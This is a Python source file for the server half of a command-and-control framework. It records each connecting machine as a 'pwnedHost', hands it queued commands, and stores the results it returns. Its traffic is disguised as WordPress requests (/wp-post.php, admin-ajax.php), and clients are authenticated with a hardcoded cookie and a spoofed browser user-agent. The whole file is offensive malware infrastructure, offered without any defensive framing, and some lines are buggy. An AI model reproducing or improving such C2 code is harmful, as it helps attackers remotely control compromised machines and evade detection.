from http.server import *
import random
import string
import ssl
from command_control.models import pwnedHost


class Server_Response(BaseHTTPRequestHandler):

    # chars = string.ascii_letters + string.digits
    # session_value = ''.join(random.choice(chars) for i in range(20))
    global session_value, user_agent, value
    session_value = "6Q2HydryJknyIyyVv8Om"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
    trantab = str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
                            "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
    value = session_value.translate(trantab)

    def set_attributes(self):
        global ip
        global host
        ip = self.client_address[0]
        if pwnedHost.objects.filter(ip=ip):
            host = pwnedHost.objects.get(ip=ip)
        else:
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = post_data.decode('utf-8')
            except:
                pass
            host = pwnedHost(author=author, ip=ip, username="")
            host.save()

    def set_headers(self):
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie',session_value)
        # self.send_header('Server', 'Microsoft IIS/7.5')
        self.end_headers()

    def unauth_set_headers(self):
        self.send_response(403, "forbidden")
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    # Allow GET
    def do_GET(self):

        self.set_attributes()

        global URI, cookie, agent
        print(self.headers)
        try:
            URI = self.raw_requestline.decode().split(" ")[1]
            cookie = self.headers['Cookie'].split(" = ")[-1]
            agent = self.headers['User-agent']
        except:
            pass

        message = host.cmd[6:]
        print(host.cmd)

        if URI == "/wp-post.php" and cookie == session_value and agent == user_agent:
            self.set_headers()
            if message:
                self.wfile.write(bytes(message).encode("utf-8"))
                host.cmd = ""
                host.save()
        else:
            self.unauth_set_headers()
            msg = " You are not authorized. Your access is forbidden."
            self.wfile.write(msg.encode('utf-8'))


    # Allow POST
    def do_POST(self):
        self.set_attributes()
        global URI, cookie, agent
        try:
            URI = self.raw_requestline.decode().split(" ")[1]
            cookie = self.headers['Cookie'].split(" = ")[-1]
            agent = self.headers['User-agent']
        except:
            pass

        if URI == "/wp-admin/admin-ajax.php" and cookie == session_value and agent == user_agent:
            self.set_headers()
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = post_data.decode('utf-8')
            data_len = int(len(data) - 20)

            if data[-20:] != str(value):
                print("The verification code %s was not received" %value)

            if data:
                host.result = data[:data_len] + "\n"
                host.save()

        else:
            self.unauth_set_headers()
            msg = " You are not authorized. Your access is forbidden."
            self.wfile.write(msg.encode('utf-8'))


def run(auth_user, ip , port, enc_key):
    global author
    global secret
    global cipher
    secret = enc_key
    author = auth_user
    global Server_Response
    print("Server Started ..!!")
    server_address = (ip, port)
    httpd = HTTPServer(server_address, Server_Response)
    # httpd.socket = ssl.wrap_socket (httpd.socket, certfile='server.cert', keyfile='server.key', server_side=True)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='/var/www/desi_command_control/server.cert', keyfile="/var/www/desi_command_control/server.key", server_side=True)
    print('running server...')
    httpd.serve_forever()


